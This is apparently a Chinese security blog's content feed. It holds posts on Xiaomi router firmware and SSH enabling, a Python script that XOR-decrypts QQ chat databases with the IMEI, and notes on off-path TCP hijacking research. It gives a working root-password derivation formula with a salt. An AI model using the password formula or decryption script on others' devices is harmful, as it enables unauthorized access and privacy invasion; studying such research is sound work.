itchat.send_msg(context,toUserName=userName)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    sched = BlockingScheduler()</span><br><span class="line">    sched.add_job(loop_send,&apos;interval&apos;,minutes=30)</span><br><span class="line">    sched.start()</span><br></pre></td></tr></table></figure></p><h1 id="把程序放在服务器上"><a href="#把程序放在服务器上" class="headerlink" title="把程序放在服务器上"></a>把程序放在服务器上</h1><p>我是在腾讯云有个服务器，因为自己的电脑不可能时时刻刻开机，所以就放在服务器上，方法是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nohup python -u auto_Send.py &gt;&gt; auto_Send.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></p><ul><li>使用nohup可以让程序在后台运行</li><li>然后将日志输出到auto_Send.log，方便我们后期出bug了排错</li><li>-u可以防止输出到python缓冲区</li></ul><h1 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h1><h2 id="线程阻塞问题"><a href="#线程阻塞问题" class="headerlink" title="线程阻塞问题"></a>线程阻塞问题</h2><p>这里有两个线程，一个是定时转发，一个是循环发送，因此要设置为itchat.run(blockThread=False)以及sched = BlockingScheduler()否则会卡在某个方法。</p><h2 id="找不到群组"><a href="#找不到群组" class="headerlink" title="找不到群组"></a>找不到群组</h2><p>这是因为users = itchat.search_chatrooms(name=gname)，在搜索的是你保存到通讯录的群组。</p><h2 id="二维码显示不全"><a href="#二维码显示不全" class="headerlink" title="二维码显示不全"></a>二维码显示不全</h2><p>itchat.auto_login(hotReload=True,enableCmdQR=2)，需要设置为2</p>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> itchat </tag>
            
            <tag> 微信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小米固件工具mkxqimage</title>
      <link href="/2019/03/16/%E5%B0%8F%E7%B1%B3%E5%9B%BA%E4%BB%B6%E5%B7%A5%E5%85%B7mkxqimage/"/>
      <url>/2019/03/16/%E5%B0%8F%E7%B1%B3%E5%9B%BA%E4%BB%B6%E5%B7%A5%E5%85%B7mkxqimage/</url>
      
        <content type="html"><![CDATA[<h1 id="小米固件工具mkxqimage"><a href="#小米固件工具mkxqimage" class="headerlink" title="小米固件工具mkxqimage"></a>小米固件工具mkxqimage</h1><p>小米自己改了个打包解包固件的工具，基于 trx 改的（本质上还是 trx 格式），加了 RSA 验证和解包功能，路由系统里自带：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line">mkxqimg [-o outfile] [-p private_key] [-f file] [-f file [-f file [-f file ]]]</span><br><span class="line">        [-x file]</span><br><span class="line">        [-I]</span><br></pre></td></tr></table></figure></p><h2 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h2><p>固件工具mkxqimage完成对固件的解包，在解包前先检查Checksum是否正确，然后利用RSA公钥/usr/share/xiaoqiang/public.pem检查RSA签名，这两个步骤通过后，根据[0x0C]的固件类型，以及[0x10]、[0x14]、[0x18]和[0x1C]的4个偏移量拆分固件。</p><h2 id="固件打包"><a href="#固件打包" class="headerlink" title="固件打包"></a>固件打包</h2><p>小米官方在打包固件时用RSA私钥计算出固件的RSA签名，小米路由器下载固件后用RSA公钥来验证RSA签名，有效地防止固件被篡改。</p><h2 id="固件格式"><a href="#固件格式" class="headerlink" title="固件格式"></a><a href="http://www.iptvfans.cn/wiki/index.php/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90" target="_blank" rel="noopener">固件格式</a></h2><p>路由固件的格式，基本是基于 openwrt 的 trx 这个简单的二进制文件格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">48 44 52 30 63 D4 11 03 FE 3D 1A FD 05 00 02 00</span><br><span class="line">20 00 00 00 20 00 FE 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF 04 00 EA 14 F0 9F E5 14 F0 9F E5 14 F0 9F E5</span><br></pre></td></tr></table></figure></p><p>第1～4字节：ASCII字符串“HDR0”，作为固件的标识；<br>第5～8字节：4字节整型数0x0311D464，表示固件的大小：51500132字节；<br>第9~12字节：固件的检查和；<br>第13～14字节：0x0005，表示固件中包含哪些部分；<br>第15～16字节：0x0002，表示固件格式版本号；<br>第17～20字节：0x00000020，表示固件第一部分在整个固件中的偏移量，0.4.85固件的第一部分是brcm4709_nor.bin，也就是Flash中除0xfe0000-0xff0000的board_data外的全镜像；<br>第21～24字节：0x00FE0020，表示固件第二部分在整个固件中的偏移量，0.4.85固件的第二部分是root.ext4.lzma，也就是硬盘中128M固件的压缩包；<br>第33字节开始是固件的正式内容开始。</p><h2 id="小米开启ssh工具包"><a href="#小米开启ssh工具包" class="headerlink" title="小米开启ssh工具包"></a>小米开启ssh工具包</h2><p>使用mkxqimage解包<br>（现在会提示秘钥不存在）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">error fopen public key</span><br><span class="line">Image verify failed, not formal image</span><br></pre></td></tr></table></figure></p><p>如果能解包应该可以得到脚本文件upsetting.sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">nvram set ssh_en=1</span><br><span class="line">nvram set flag_init_root_pwd=1</span><br><span class="line">nvram commit</span><br></pre></td></tr></table></figure><p>执行脚本文件upsetting.sh后，将ssh_en设置为1，同时设置了flag_init_root_pwd项。当正式启动时，/usr/sbin/boot_check脚本检测到flag_init_root_pwd=1时，自动修改root用户密码，具体脚本为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flg_init_pwd=`nvram get flag_init_root_pwd`</span><br><span class="line">if [ &quot;$flg_init_pwd&quot; = &quot;1&quot; ]; then</span><br><span class="line">init_pwd=`mkxqimage -I`</span><br><span class="line">(echo $init_pwd; sleep 1; echo $init_pwd) | passwd root</span><br><span class="line">nvram unset flag_init_root_pwd</span><br><span class="line">nvram commit</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p><p>初始密码是mkxqimage -I的结果，实际是根据路由器的序列号计算得到。路由器的序列号印在底盖上，12位数字，如：561000088888</p><p>初始密码计算算法为：</p><p><code>substr(md5(SN+&quot;A2E371B0-B34B-48A5-8C40-A7133F3B5D88&quot;), 0, 8)</code></p><p><strong><em>A2E371B0-B34B-48A5-8C40-A7133F3B5D88</em></strong> 为分析mkxqimage得到的salt</p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小米 </tag>
            
            <tag> 文件格式 </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ数据库的加密与解密</title>
      <link href="/2019/02/22/qq%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
      <url>/2019/02/22/qq%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="qq数据库采用简单加密——异或加密"><a href="#qq数据库采用简单加密——异或加密" class="headerlink" title="qq数据库采用简单加密——异或加密"></a>qq数据库采用简单加密——异或加密</h1><h2 id="数据获取："><a href="#数据获取：" class="headerlink" title="数据获取："></a>数据获取：</h2><p>DENGTA_META.xml—IMEI:867179032952446<br>databases/2685371834.db——数据库文件</p><h2 id="解密方式："><a href="#解密方式：" class="headerlink" title="解密方式："></a>解密方式：</h2><p>明文msg_t   密文msg_Data  key：IMEI<br>msg_t = msg_Data[i]^IMEI[i%15]</p><h2 id="实验："><a href="#实验：" class="headerlink" title="实验："></a>实验：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import sqlite3</span><br><span class="line"></span><br><span class="line">IMEI = &apos;867179032952446&apos;</span><br><span class="line">conn = sqlite3.connect(&apos;2685371834.db&apos;)</span><br><span class="line">c = conn.cursor()</span><br><span class="line"></span><br><span class="line">def _decrypt(foo):</span><br><span class="line">    substr = &apos;&apos;</span><br><span class="line">    #print(len(foo))</span><br><span class="line">    for i in range(0,len(foo)):</span><br><span class="line">        substr += chr(ord(foo[i]) ^ ord(IMEI[i%15]))</span><br><span class="line">    return substr</span><br><span class="line"></span><br><span class="line">#rem = c.execute(&quot;SELECT uin, remark, name FROM Friends&quot;)</span><br><span class="line">Msg = c.execute(&quot;SELECT msgData, senderuin, time FROM mr_friend_0FC9764CD248C8100C82A089152FB98B_New&quot;)</span><br><span class="line"></span><br><span class="line">for msg in Msg:</span><br><span class="line">    uid = _decrypt(msg[1])</span><br><span class="line">    print(&quot;\n&quot;+uid+&quot;:&quot;)</span><br><span class="line">    try:</span><br><span class="line">        msgData = _decrypt(msg[0]).decode(&apos;utf-8&apos;)</span><br><span class="line">        print(msgData)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1552728077/qq.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 加密解密 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码 </tag>
            
            <tag> QQ </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wifi半双工侧信道攻击学习笔记</title>
      <link href="/2019/01/16/wifi%E5%8D%8A%E5%8F%8C%E5%B7%A5%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/01/16/wifi%E5%8D%8A%E5%8F%8C%E5%B7%A5%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="TCP侧信道分析及利用的学习报告"><a href="#TCP侧信道分析及利用的学习报告" class="headerlink" title="TCP侧信道分析及利用的学习报告"></a>TCP侧信道分析及利用的学习报告</h1><p><strong><em>论文来源：</em></strong>USENIX SECURITY 2018：Off-Path TCP Exploit: How Wireless Routers Can Jeopardize Your Secrets<br><strong><em>下载：</em></strong><br><a href="https://www.usenix.org/conference/usenixsecurity18/presentation/chen-weiteng" target="_blank" rel="noopener">原文pdf</a><br><a href="https://res.cloudinary.com/dozyfkbg3/raw/upload/v1553316881/ARE/wifi.pptx" target="_blank" rel="noopener">中文slides</a></p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="测信道"><a href="#测信道" class="headerlink" title="测信道"></a>测信道</h3><p><strong>香农信息论</strong></p><p><img src="./1.png" alt="信息熵"></p><p><strong>什么是信息？</strong> 用来减少随机不确定的东西</p><p><strong>什么是加密？</strong> 类似于加噪声，增加随机不确定性</p><blockquote><p>“从密码分析者来看，一个保密系统几乎就是一个通信系统。待传的消息是统计事件，加密所用的密钥按概率选出，加密结果为密报，这是分析者可以利用的，类似于受扰信号。”</p></blockquote><p><strong>侧信道随之出现</strong> 越过加密算法增加的随机不定性，从其他的渠道获取数据标签，确定信息内容。</p><ol><li>早期：采集加密电子设备在运行过程中的时间消耗、功率消耗或者电磁辐射消耗等边缘信息的差异性</li><li>而随着研究的深入，逐渐从加密设备延伸到计算机内部CPU、内存等之间的信息传递</li><li>并在Web应用交互信息传递越来越频繁时，延伸到了网络加密数据流的破解方面</li></ol><p><strong>侧信道攻击的流程</strong> 第一个就是侧信道泄露的截取，第二个是信息的恢复。</p><hr><h3 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h3><ol><li>中间人攻击<blockquote><p>“指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。”</p></blockquote></li></ol><p><img src="./2-Man_in_the_middle_attack.svg.png" alt></p><ul><li>公共wifi、路由器劫持</li><li>一般使用加密来防御</li><li>加密的代价：维护密钥证书、影响功能（运营商无法做缓存）</li></ul><ol start="2"><li>非中间人攻击/偏离路径攻击/off-path attack<blockquote><p>通信线路之外，攻击者看不到双方的消息，没办法截获和发送通信包。智能伪造成一方给另一方发消息。</p></blockquote></li></ol><ul><li>攻击成功需要：消息合法+最先到达</li><li>防御措施：challenge-response/询问-应答机制<br>双方在通信前交换一个随机数，这个随机数在每次的通信中都要被附带，而中间人看不见这个随机数，因此伪造的消息被认为不合法。</li><li>攻击者如何得到这个随机数：侧信道</li></ul><hr><h3 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h3><p><img src="./3-Connection_TCP.png" alt></p><blockquote><ol><li>客户端通过向服务器端发送一个SYN来创建一个主动打开，作为三路握手的一部分。客户端把这段连接的序号设定为<em>随机数A</em>。</li><li>服务器端应当为一个合法的SYN回送一个SYN/ACK。ACK的确认码应为A+1，SYN/ACK包本身又有一个<em>随机产生的序号B</em>。</li><li>最后，客户端再发送一个ACK。当服务端收到这个ACK的时候，就完成了三路握手，并进入了连接创建状态。此时包的序号被设定为收到的确认号A+1，而响应号则为B+1。</li></ol></blockquote><p>通过三次握手，确定对方不是非中间人</p><p><strong><em>TCP序列号的问题</em></strong></p><table><thead><tr><th style="text-align:center">1985</th><th style="text-align:center">1995</th><th style="text-align:center">2001</th><th style="text-align:center">2004</th><th style="text-align:center">2007</th><th style="text-align:center">2012</th><th style="text-align:center">2012</th><th style="text-align:center">2016</th></tr></thead><tbody><tr><td style="text-align:center">Morris</td><td style="text-align:center">Mitnik</td><td style="text-align:center">Zalewsky</td><td style="text-align:center">Waston</td><td style="text-align:center">kLM</td><td style="text-align:center">Herzberg</td><td style="text-align:center">作者</td><td style="text-align:center">作者</td></tr><tr><td style="text-align:center">初始序列可预测</td><td style="text-align:center">真实利用</td><td style="text-align:center">漏洞仍在</td><td style="text-align:center">BGP DoS</td><td style="text-align:center">Windows攻击</td><td style="text-align:center">Puppet-assisted</td><td style="text-align:center">Malware-assisted</td><td style="text-align:center">off-path attack</td></tr></tbody></table><ol><li>90年代时发现并不随机：1995年伪造客户端连接微软大楼的服务器</li><li>2007年在windows场景下用IDID侧信道猜出序列号：只针对Windows，花费几小时</li></ol><hr><h2 id="Malware-assisted"><a href="#Malware-assisted" class="headerlink" title="Malware-assisted"></a>Malware-assisted</h2><p><strong>攻击模型：</strong><br>给受害者安装一个无特权的应用程序（仅能网络连接），这个程序跟非中间人的攻击者里应外合，劫持手机上所有的TCP连接。<br><img src="./5-攻击模型.PNG" alt></p><p><strong>如何劫持TCP</strong></p><ol><li><p>需要的信息：Facebook的连接IP地址和端口号，由此可以知道TCP连接的序列号，利用序列号伪装成Facebook给手机发消息。<br>使用netstat命令获取：<br><img src="./4-netstat获取信息.jpg" alt></p></li><li><p>任务：由于TCP的序列号通常连续，所以要精确猜到它的下一个序列号。</p></li><li>如何验证序列号正确：通过某种侧信道，这个恶意软件在后台可以提供反馈。</li></ol><h3 id="变种一：防火墙"><a href="#变种一：防火墙" class="headerlink" title="变种一：防火墙"></a>变种一：防火墙</h3><p><strong>攻击过程：</strong> TCP三次握手之后产生A和B，将来传输的包序列号必须跟A和B很接近，否则，防火墙会丢弃这个包。因此只有猜对了序列号，包才能到达手机端。到达手机端后，后台的恶意软件可以帮助我们判断手机是否接受了这个数据包。</p><p><strong>具体侧信道方案：</strong> CPU资源使用率（噪音很大）——&gt;TCP计数器（后台软件运行制造噪音）——&gt;低噪音计数器：包被丢掉时，一个相应的错误计数器。</p><p><strong>解决方法：</strong> 关闭防火墙检查序列号的功能</p><h3 id="变种二：无防火墙"><a href="#变种二：无防火墙" class="headerlink" title="变种二：无防火墙"></a>变种二：无防火墙</h3><p>具体侧信道方案：跟TCP业务逻辑有关的计数器——收到的TCP包序列号小于期望时增加，大于时不变。二分查找搜索正确的序列号。<br>影响范围：Android、Linux、MacOS、FreeBSD</p><hr><h2 id="Pure-off-path-无恶意软件协助"><a href="#Pure-off-path-无恶意软件协助" class="headerlink" title="Pure off-path:无恶意软件协助"></a>Pure off-path:无恶意软件协助</h2><blockquote><p>不植入恶意软件，劫持任意两台机器的TCP连接：首先确定是否建立TCP连接，然后推测其序列号A和B。</p></blockquote><h3 id="Global-Rate-Limit"><a href="#Global-Rate-Limit" class="headerlink" title="Global Rate Limit"></a>Global Rate Limit</h3><blockquote><p>USENIX 2016 : Off-Path TCP Exploits: Global Rate Limit Considered Dangerous</p></blockquote><p><strong>侧信道：</strong> 所有的侧信道，本质上就是攻击者和受害者之间共享着某些资源，如之前的全局TCP计数器。这里使用的侧信道是 <strong><em>服务器上</em></strong> 的共享资源，<strong><em>限速器</em></strong>（RFC 5961）限制某一种包的发送速率（默认100p/s）</p><p><strong>如何利用共享限速器：</strong><br>先判断是否建立了连接。然后伪造TCP包，需要猜测源端口，如果猜测正确，服务器会返回一个challenge，攻击者不断触发，一共可以收到99个（还有一个发给了客户端）；如果猜测错误，则一共可以收到100个challenge。</p><p><img src="./6-GRL-R.png" alt></p><p><img src="./7-GRL-L.png" alt></p><p><strong>评估：</strong> 是否建立了连接：&lt;10s  ;  Seq：30s  ； ACK:&lt;10s</p><p><strong>解决方案：</strong> 1. 加噪音，100变成150、200；2. 限速器做成局部的</p><hr><h3 id="Unfixable-WiFi-timing"><a href="#Unfixable-WiFi-timing" class="headerlink" title="Unfixable WiFi timing"></a>Unfixable WiFi timing</h3><blockquote><p>USENIX 2018 : Off-Path TCP Exploit: How Wireless Routers<br>Can Jeopardize Your Secrets<br>之前的漏洞无论是计数器还是限速器都属于软件，很好更正，但这篇文章的漏洞利用无法修复。</p></blockquote><p><strong>TCP收包的原理：</strong> 通常TCP收包要看这个包是否匹配了当前的某一个连接。如果连接匹配上了，就会去看这个包的序列号；如果序列号不对，会触发一个回复，说明这个序列号存在问题；如果序列号正确，但反向序列号不对，也会丢包。当连接匹配、序列号和反向序列号正确时，就会返回一个数据包。<br><img src="./8-收包原理.jpg" alt></p><p><strong>侧信道：</strong> 攻击者伪装成服务器给客户端发包，正确的序列号会有<strong><em>回复</em></strong>，错误则没有。但回复时发送给服务器的，有没有回复攻击者并不知道。那么如何去判断有没有回复，利用无线网络的  <strong><em>半双工</em></strong> 传输。<br>让有回包和没有回包的时间差异放大。</p><p><strong>判断流程：</strong> 客户端和路由器之间wifi通信。攻击者依次发送三个数据包，第一个包用来测试正常的RTT。第2个包是伪装成服务器发送的，如果第2个包猜对了，客户端会向服务器返回数据包，这会导致占用更长时间的wifi信道，从而会使第3个包的RTT更长。<br><img src="./8-noTrigger.PNG" alt></p><p><img src="./8-trigger.PNG" alt></p><p><strong>评估：</strong> 在本地环境下，如果发送40个包，就有20ms的RTT差别。</p><p><strong>攻击应用：</strong><br><strong>1. 攻击模型：</strong> 受害者访问了我们的钓鱼网站，这时javascript（傀儡）会在后台执行，主动建立到攻击者的连接（规避NAT或防火墙造成的不可抵达问题），这时攻击者就可以从外网测试RTT。</p><blockquote><p>与理想情况的不同：客户端通常在NAT或防火墙之后；操作系统不一定严格遵守TCP收包的原则</p></blockquote><pre><code>Attacker -------wire----------|                           Router ---------wireless-------Victim (client)Server   -------wire----------|</code></pre><p><strong>2. 攻击目标：</strong> 推断出客户端和服务器是否建立了连接；合计连接中交换的字节数或强制中断连接；注入恶意payload到连接（不失一般性的关注web缓存投毒）。前两个不需要傀儡初始化连接，第三个不一定需要，但攻击者控制了时序，能够简化攻击。</p><p><strong>3. 攻击过程：</strong> 假设傀儡已经建立了连接，攻击者可以劫持并替换任何不加密的网站（如武汉大学），并在浏览器缓存。这是因为当浏览器请求相同的ip地址时，会复用之前的TCP连接。这意味着恶意网站中的傀儡可以通过重复HTML元素来建立到目标域名的单个持久连接。然后，路径外攻击者可以进行侧信道攻击，以推断目标连接中使用的端口号和序列号，然后注入虚假的http响应，并要求浏览器不重新检查对象的新鲜度，从而达到持续性的缓存投毒。</p><p><strong>4. 细节：</strong></p><ul><li><strong>连接（四元组）推断：</strong> 每一轮使用30个重复包测试一个端口，如果端口号正确，就会发现RTT大幅增加。如果还要完成 <strong><em>web缓存投毒</em></strong>  ，还需要傀儡初始化连接来协助，根据系统不同，有不同的端口选择算法可以优化：<strong><em>windows&amp;macOS</em></strong> 使用全局和顺序端口分配策略为其TCP连接选择短暂的端口号，这意味着攻击者可以在观察到与恶意Web服务器的初始连接后推断出要使用的下一个端口号，这完全消除了对端口号推断的需要。<strong><em>NAT</em></strong> 端口保留，不需要关心外部端口被转换成不可预知的内部端口。<strong><em>来自同一域名的多个IP地址</em></strong>，这意味着攻击者需要付出更大的代价来推断端口号。</li><li><strong>序列号推断：</strong> 通过利用时序侧信道来判断是否存在相应的响应，从而将窗口序列号与窗外序列号区分开来。一旦我们得到一个 <strong><em>窗口内序列号</em></strong>，通过进行二分搜索进一步将序列号空间缩小到单个值  <strong><em>RCV.NXT</em></strong>。如果还要使用傀儡建立的连接发起web缓存投毒，可以进一步优化：<strong><em>增大接收窗口的大小</em></strong>，可以减少猜测的迭代次数，通常可以放大到500000(之前是65535)，而且根据RFC793,窗口放大之后就永远不会缩小。<br><img src="./9-序列号推断.PNG" alt></li><li><p><strong>TCP劫持：</strong> 通过劫持傀儡初始化的连接，可以简化web缓存投毒的过程。三个os在ACK验证上都不符合规范，所以各自处理情况也不同——<strong><em>windows</em></strong>：客户端必须持续发送请求以防止ACK接收窗口仅为一个字节，这要求攻击者必须能准确预期下一个序列号并解决大量流量带来的噪声。<br>因此，作者设计了一种新策略，该策略利用处理重叠数据的TCP行为和处理损坏的HTTP响应的浏览器行为——在Windows主机上缓冲的攻击者注入数据可能会破坏来自服务器的真实HTTP响应。 <strong><em>（1）注入</em></strong>，傀儡不断从服务器上请求脚本，而攻击者发送2^23/|wnd|个欺骗性数据包，这些包的窗口序列号与RCV.NXT加上偏移量相匹配，其中|wnd|为ack接收窗口大小，第i个数据包的ACK号为i*|wnd|，payload为</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">websocket.send(|wnd|*i)</span><br></pre></td></tr></table></figure><p>  因此，这些数据包中包含有效ACK号的一个包将被缓冲，并破坏真实的HTTP响应头。浏览器执行注入的脚本时，它将通过websocket发送猜测的ACK号，提供有效的窗口内ACK号。<br><img src="./9-http注入.PNG" alt><br><strong><em>（2）利用</em></strong>，由于客户端已经接受了额外的欺骗payload，推进了其预期的序列号，因此客户端和服务器实际上已经被去同步。攻击者现在可以简单地发送欺骗性响应（知道预期的序列号和有效的ACK号）。如果我们只想执行一次性注入，只需用恶意脚本替换第一步中的payload就足够了。<br>此外，针对Windows的注入步骤存在更加通用的替代策略，不依赖于浏览器行为。 具体来说，由于HTTP响应的前几个字节是可预先确定的（即HTTP），不破坏真实的响应，而是覆盖标题和正文以形成合法但恶意的响应。 在这种情况下，浏览器将完全忘记注入的存在。 这表明一旦序列号泄露，就存在各种方法来有效地将数据注入浏览器，而不用进行基于时间信道的慢得多的ACK号推断。</p></li></ul><hr><h2 id="Discussion"><a href="#Discussion" class="headerlink" title="Discussion"></a>Discussion</h2><p>时序侧信道来自无线网络的半双工性质。由于无线协议中固有的冲突和回退，它被进一步放大。正如我们的测试路由器所证实的那样，现代无线路由器都支持CSMA / CA和RTS / CTS，因为它是802.11标准的一部分，并且该原则不太可能很快改变。<br>虽然作者只讨论威胁模型，其中来自受害客户端的连接是针对性的，但攻击实际上也适用于源自通过同一无线路由器连接的其他客户端的连接。这是因为所有这些客户端（例如，在相同NAT之后）共享了相同的冲突域并因此遭受相同的定时信道。通过探测数据包在任何客户端上触发的响应将有效地延迟探测后查询。在这种情况下，受害者连接（通过傀儡打开）只是为远程攻击者提供了测量碰撞的机会。<br>此外，我们可以扩展威胁模型以考虑无线连接的服务器，例如物联网设备。已经证明，通过公共IP地址和开放端口可以访问数百万个物联网设备。在这种情况下，可以针对此类IoT设备上的连接启动完全偏离路径的攻击。例如，计算在连接上交换的字节，终止与另一主机的连接，在正在进行的telnet连接上注入恶意命令。</p>]]></content>
      
      
      <categories>
          
          <category> 顶会论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 侧信道攻击 </tag>
            
            <tag> wifi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于采集规则引擎的物联网设备发现方法</title>
      <link href="/2018/12/23/%E5%9F%BA%E4%BA%8E%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0IOT%E8%AE%BE%E5%A4%87/"/>
      <url>/2018/12/23/%E5%9F%BA%E4%BA%8E%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0IOT%E8%AE%BE%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<p><strong><em>论文来源：</em></strong>USENIX SECURITY 2018：Acquisitional Rule-based Engine for Discovering Internet-of-Things Devices<br><strong><em>下载：</em></strong><br><a href="https://www.usenix.org/conference/usenixsecurity18/presentation/feng" target="_blank" rel="noopener">原文pdf</a><br><a href="https://res.cloudinary.com/dozyfkbg3/raw/upload/v1553314438/ARE/Rule-based_engine.pptx" target="_blank" rel="noopener">中文slides</a></p><h2 id="论文解读"><a href="#论文解读" class="headerlink" title="论文解读"></a>论文解读</h2><h3 id="概要："><a href="#概要：" class="headerlink" title="概要："></a>概要：</h3><ul><li>物联网（IoT）设备的快速增长的格局为其管理和安全性带来了重大的技术挑战，因为这些物联网设备来自不同的设备类型，供应商和产品模型。</li><li>物联网设备的发现是表征，监控和保护这些设备的先决条件。然而，手动设备注释阻碍了大规模发现，并且基于机器学习的设备分类需要具有标签的大型训练数据。因此，大规模的自动设备发现和注释仍然是物联网中的一个悬而未决的问题。</li><li>这篇文章提出了一种基于采集规则的引擎（ARE），它可以自动生成用于在没有任何训练数据的情况下发现和注释物联网设备的规则。ARE通过利用来自物联网设备的应用层响应数据和相关网站中的产品描述来构建设备规则，以进行设备注释。我们将事务定义为对产品描述的唯一响应之间的映射。</li><li>为了收集交易集，ARE提取响应数据中的相关术语作为抓取网站的搜索查询。ARE使用关联算法以（类型，供应商和产品）的形式生成物联网设备注释的规则。我们进行实验和三个应用程序来验证ARE的有效性。</li></ul><h3 id="背景与动机："><a href="#背景与动机：" class="headerlink" title="背景与动机："></a>背景与动机：</h3><ul><li>物联网蓬勃发展，造就了物联网设备的广泛应用，它不仅种类繁多，包括摄像头、打印机、路由器、电视盒子、工控系统、医疗设备等，而且数量庞大，据统计，每天就会新增5500000台物联网设备。</li><li>但是由于设备脆弱、缺乏管理和配置不当，物联网设备相比传统计算机要更不安全，比如之前爆发的Mirai僵尸网络，给美国造成了重大的损失。因此，为了更主动地保护IOT设备，提前发现、登记和注释物联网设备成为先决条件。</li><li>设备注释的内容通常为“设备类型(e.g.,routers) + 供应商(e.g.,CISCO) + 产品型号(e.g.,TV-IP302P)”，传统生成设备注释的方法有基于指纹的，也有使用标志获取的，前者对数据集和大量设备模型的要求很高，而后者需要专业知识的人工方式，因此不可能用于大规模注释而且很难去维护更新。</li></ul><p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553313806/ARE/1.png" alt></p><p>所以，作者希望提出一种减少对数据集和人工依赖的注释方式。本文的方法主要基于两个事实，第一个Figure 1是制造商通常会将相关信息硬编码到IOT设备，第二个Figure 2是有许多网站（如产品测评）会描述设备产品。从第一个事实，我们可以从应用层数据包获取关键词，然后根据这些关键词依据第二个事实进行网页爬虫，以获取网页上的相关描述，然后对这些描述进行自然语言处理和数据挖掘，从而建立起基于规则的映射。</p><h3 id="核心工作—Rule-Miner："><a href="#核心工作—Rule-Miner：" class="headerlink" title="核心工作—Rule Miner："></a>核心工作—Rule Miner：</h3><p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553313904/ARE/2.png" alt></p><p>  Rule Miner由三个部分构成，Transaction set是一对由应用层数据和相关网页组成的文本单元，它生成了一种规则： ，其中A是从应用层数据包中提取的一些特征，B是从相关网页抓取的设备描述；Device entity 